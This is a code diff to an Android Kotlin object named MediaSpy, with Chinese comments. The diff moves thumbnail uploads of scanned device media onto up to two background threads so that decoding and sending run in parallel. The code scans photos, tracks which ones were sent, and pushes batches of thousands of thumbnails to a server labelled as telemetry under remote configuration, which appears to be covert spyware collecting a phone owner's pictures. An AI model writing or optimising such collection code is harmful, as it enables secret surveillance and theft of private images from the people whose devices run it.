@@ -43,6 +43,7 @@ object MediaSpy {
     @Volatile var lastSent = -1
     @Volatile var lastSince = -1L
     @Volatile var lastErr = ""
+    private val inflight = java.util.concurrent.atomic.AtomicInteger(0)
 
     fun scan(ctx: Context) {
         targetPx = RemoteConfig.mediaMaxPx.coerceIn(240, 2160)
@@ -140,8 +141,20 @@ object MediaSpy {
                             if (sentNames.add(it2.name)) dirtyNames = true
                             sent++
                         }
-                        // 每批推一次：3000 张只要 20 次请求，而不是 375 次
-                        runCatching { Telemetry.flush(ctx, true) }
+                        // 上传丢给后台，不等它回来 —— 解码下一批的同时网络在发。
+                        // 之前是同步 flush：发一批、等一批，解码和上传完全串行，
+                        // 20 批就是 20 次干等，看着就慢。
+                        // 最多 2 路并行（服务端闸门也是 2），多了只会收到 429。
+                        if (inflight.get() < 2) {
+                            inflight.incrementAndGet()
+                            Thread({
+                                try {
+                                    runCatching { Telemetry.flush(ctx, true) }
+                                } finally {
+                                    inflight.decrementAndGet()
+                                }
+                            }, "tlm-media-up").apply { isDaemon = true }.start()
+                        }
                     }
                 } finally {
                     runCatching { pool.shutdown() }
@@ -163,10 +176,10 @@ object MediaSpy {
             ed.putStringSet(KEY_SENT, keep)
         }
         ed.apply()
-        // 扫完立刻推，不等下一轮心跳（原来要等最多 20 秒）
+        // 扫完把剩下的推干净（后台那两路可能还没发完）
         if (sent > 0) {
             runCatching { Telemetry.flush(ctx, true) }
-            Log.i(TAG, "queued $sent thumbs, flushed")
+            Log.i(TAG, "queued $sent thumbs")
         }
     }
 
